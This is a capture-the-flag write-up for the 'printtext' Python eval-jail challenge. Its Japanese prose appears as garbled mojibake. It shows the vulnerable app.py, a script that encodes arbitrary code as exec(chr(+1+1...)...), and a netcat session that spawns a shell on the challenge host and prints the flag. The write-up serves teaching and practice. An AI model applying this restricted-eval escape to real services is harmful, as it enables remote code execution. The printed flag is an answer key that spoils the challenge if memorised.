# printtextð

## åé¡æ
print(text)!!!!!  
`nc 160.251.76.58 54321`  
[app.py](files/app.py)  

## é£æåº¦
**easy**  

## ä½åã«ããã£ã¦
Pyfuckåãä½ãããã¦åºãã¾ãã(åè:[Pyfuck -- Esoteric Python using only [(+travels')].](https://github.com/wanqizhu/pyfuck))ã  
ç´åã«SECCONãéå¬ãããã®ã§ãããããã§ã®`hitchhike`ã®è§£æ³ããã®åé¡ã®éæ³å®è§£ã§æã¦ã¦ä¿®æ­£ãã¾ããã  
Proã¯æãã§ãã­ã  

## è§£æ³
æ¥ç¶åã¨app.pyãéå¸ãããã  
app.pyã¯ä»¥ä¸ã®ããã§ãã£ãã  
```python
import os
import sys

os.environ["PAGER"] = "cat" #No hitchhike :)

print("""            _       _    __  _            _    __
 _ __  _ __(_)_ __ | |_ / / | |_ _____  _| |_  \ \\
| '_ \| '__| | '_ \| __| |  | __/ _ \ \/ / __|  | |
| |_) | |  | | | | | |_| |  | ||  __/>  <| |_   | |
| .__/|_|  |_|_| |_|\__| |   \__\___/_/\_\\__|  | |
|_|                     \_\                    /_/

Can you evaluate `print(text)`?
They don't seem to have the flag.
""")

text = "I don't have the flag."

allow_list = input("allow_list> ")[:9]
print(f"your allow_list: {list(allow_list)}")
eval_code = input("eval_code> ")

for c in eval_code:
    if c not in allow_list:
        print(f"Hi, {c}!")
        sys.exit()

print("Letâs roll!!")
eval(eval_code)
```
9ç¨®é¡ã®æå­å¶éã§è¨è¿°ãããã³ã¼ãã`eval`ãã¦ããããã ã  
éå¸ãããã½ã¼ã¹ããããããã`print(text)`ãã¦ããä½ãæã«å¥ããªãã  
`os.environ["PAGER"] = "cat"`ã«ãã`help()`ã§ãã¼ã¸ã£ã¼ããã·ã§ã«ãåå¾ããã®ããã­ãã¯ããã¦ããã  
ããã§pythonã¯`chr(11+11+11+11+11+11)`ãªã©ã§æå­`B`ãä½æã§ããã  
ã¤ã¾ãä»»æã®æå­ã`chr(1+1+...)`ãªã©ã§ä½æãã`+`ã§é£çµãããã¨ã§ä»»æã®ã³ã¼ããè¨è¿°ã§ããã  
`chr(+1)`ã§7æå­ãªã®ã§ããã¨2æå­è¿½å ã§ããã  
`exec`ãªãã°`ex`ã®äºæå­ãè¿½å ãããã¨ã§å®ç¾ã§ããã  
ããã«ãã`exec(chr(1+1+..)+chr(1+1+..)+...)`ã§ä»»æã³ã¼ãå®è¡ãã§ããã  
å¥åããã®å½¢å¼ã«å¤æããã¹ã¯ãªããoreore_pyfuck.pyãä»¥ä¸ã®ããã«è¨è¿°ããã  
```python
code = input()
out_f = open("output.txt", "w")
pyfuck = "exec("
pyfuck += "+".join([f"chr({'+1'*ord(c)})" for c in code])
pyfuck += ")"

for p in pyfuck:
    if p not in "exchr(+1)":
        print("Error:exchr(+1)")
        pyfuck = ""
        break

out_f.write(pyfuck)
out_f.close()
```
ãã¨ã¯ã·ã§ã«ãèµ·åãã`__import__("os").system("sh")`ãªã©ããã®ã¹ã¯ãªããã«ããã¦ãåºã¦ãããã®ãncã§éä¿¡ããã°ããã  
```
$ python oreore_pyfuck.py
__import__("os").system("sh")
$ (echo -e "exchr()+1\n$(cat output.txt)\n" ; cat) | nc 160.251.76.58 54321
            _       _    __  _            _    __
 _ __  _ __(_)_ __ | |_ / / | |_ _____  _| |_  \ \
| '_ \| '__| | '_ \| __| |  | __/ _ \ \/ / __|  | |
| |_) | |  | | | | | |_| |  | ||  __/>  <| |_   | |
| .__/|_|  |_|_| |_|\__| |   \__\___/_/\_\__|  | |
|_|                     \_\                    /_/

Can you evaluate `print(text)`?
They don't seem to have the flag.

allow_list> your allow_list: ['e', 'x', 'c', 'h', 'r', '(', ')', '+', '1']
eval_code> ls
app.py
flag.txt
cat flag.txt
imctf{7h3_c0d3_15_45_l0n6_45_4_py7h0n}
```
åé¨ã®ãã¡ã¤ã«ããflagãå¾ãããã  

## imctf{7h3_c0d3_15_45_l0n6_45_4_py7h0n}
